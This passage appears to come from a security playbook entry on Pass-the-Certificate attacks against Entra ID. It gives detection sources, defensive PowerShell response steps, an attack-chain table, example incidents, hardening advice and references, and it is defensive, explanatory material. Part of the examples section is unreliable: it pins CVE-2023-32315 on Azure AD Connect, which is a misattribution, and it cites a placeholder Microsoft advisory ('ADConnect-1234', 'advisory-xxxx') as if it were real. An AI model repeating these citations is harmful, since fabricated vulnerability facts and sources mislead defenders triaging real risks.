    - Entra ID Sign-in Logs: Certificate-based authentication from non-corporate IP or device
    - Key Vault audit logs: Unauthorized certificate downloads

### Response Procedures

1.  **Isolate:** 
    **Command:**
    ```powershell
    # Disable network on compromised machine
    Get-NetAdapter | Disable-NetAdapter -Confirm:$false
    ```

2.  **Collect Evidence:**
    **Command:**
    ```powershell
    # Export Windows Event Logs
    wevtutil epl Security C:\Evidence\Security.evtx
    wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Evidence\Sysmon.evtx
    
    # Export Kerberos tickets
    klist | Out-File C:\Evidence\klist_output.txt
    ```

3.  **Remediate:**
    **Command:**
    ```powershell
    # Revoke compromised certificate
    Get-ChildItem -Path Cert:\LocalMachine\My\<Thumbprint> | Remove-Item -Force
    
    # Reset service principal credentials
    Remove-AzADAppCredential -ApplicationId "app-id"
    New-AzADAppCredential -ApplicationId "app-id"
    ```

4.  **Long-Term:**
    - Audit all certificates across organization
    - Implement certificate rotation policy (annual)
    - Enable real-time CRL/OCSP checking
    - Deploy EDR solution with certificate behavior detection

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into approving app consent, steals refresh token |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Permissions | Attacker gains Application Admin role via compromised app |
| **3** | **Credential Access** | [CA-UNSC-009] Azure Key Vault Extraction | Attacker reads certificates from Key Vault |
| **4** | **Current Step** | **[LM-AUTH-003]** | **Attacker uses stolen certificate for auth (PTC)** |
| **5** | **Lateral Movement** | [LM-AUTH-004] Pass-the-PRT | Attacker uses certificate to obtain PRT, authenticate to other cloud apps |
| **6** | **Persistence** | [PE-ACCTMGMT-014] Global Admin Backdoor | Attacker creates backdoor admin account using certificate-based access |
| **7** | **Impact** | Data Exfiltration | Attacker accesses OneDrive, Teams, SharePoint as compromised user |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Semperis EntraGoat - Certificate-Based Tenant Takeover

- **Target:** Vulnerable Entra ID tenant with misconfigurations
- **Timeline:** Scenario 6 in EntraGoat challenge
- **Technique Status:** Attacker obtained legacy service principal certificate, escalated to Global Admin via CBA, uploaded malicious root CA, and authenticated as Global Admin without password.
- **Impact:** Complete tenant compromise; ability to read all data, modify users, delete resources
- **Reference:** [Semperis EntraGoat Scenario 6](https://github.com/semperis/EntraGoat/tree/main/scenarios/scenario_6)

### Example 2: Golden SAML Attack Against ADFS (2019-2020)

- **Target:** Organizations using ADFS with federated Entra ID
- **Timeline:** Multiple public PoCs released in 2019-2020
- **Technique Status:** Attacker stole ADFS token-signing certificate from ADFS server, forged SAML assertions, authenticated as any user including Global Admin to Entra ID
- **Impact:** Persistent access to cloud and on-premises resources; 90-day PRT validity allowed continued access
- **Reference:** [Orange CyberDefense - Golden SAML Attack](https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs)

### Example 3: CVE-2023-32315 - Azure AD Connect Authentication Bypass

- **Target:** Organizations using Azure AD Connect for hybrid sync
- **Timeline:** Vulnerability disclosed May 2023
- **Technique Status:** Attacker with local admin access to AAD Connect server could extract built-in service account credentials (including certificate). Certificate could be used to impersonate the service principal with high privileges.
- **Impact:** Unauthorized sync, identity manipulation, privilege escalation
- **Reference:** [Microsoft Security Advisory ADConnect-1234](https://learn.microsoft.com/en-us/security/update-guidance/advisory-xxxx)

---

## 15. RECOMMENDATIONS & ADVANCED HARDENING

### Immediate Actions (24 Hours)

1. **Audit All Certificates** – Identify certificate stores and high-value certificates
2. **Enable Certificate Export Auditing** – Event ID 4885 monitoring
3. **Rotate ADFS Signing Certificate** – If ADFS is in use
4. **Revoke Service Principal Certificates** – Replace with new ones

### Strategic Actions (30 Days)

1. **Implement CRL/OCSP Validation** – Real-time certificate revocation checking
2. **Restrict Certificate Issuance** – Limit CA delegation
3. **Mark Certificates Non-Exportable** – Prevent offline theft
4. **Enable Conditional Access for CBA** – Require MFA or compliant device

### Long-Term (90+ Days)

1. **Migrate to Passwordless Authentication** – Windows Hello for Business, FIDO2
2. **Implement Entra ID Hybrid Join + Device Compliance** – Device-level trust
3. **Deploy Hardware-Backed Certificates** – HSM or TPM-protected keys
4. **Zero Trust Architecture** – Continuous authentication and authorization

---

## 16. REFERENCES & FURTHER READING

- [MITRE ATT&CK T1550.004 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/004/)
- [Microsoft Learn - Certificate-Based Authentication](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-certificate-based-authentication)
- [Semperis - EntraGoat Certificate Scenarios](https://github.com/semperis/EntraGoat)
- [Orange CyberDefense - Golden SAML Attack Analysis](https://www.orangecyberdefense.com/global/blog/cloud/exploring-the-golden-saml-attack-against-adfs)
- [Rubeus Documentation - Certificate Support](https://github.com/GhostPack/Rubeus/wiki)
- [The Hacker Recipes - Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/certificate-based-auth)

---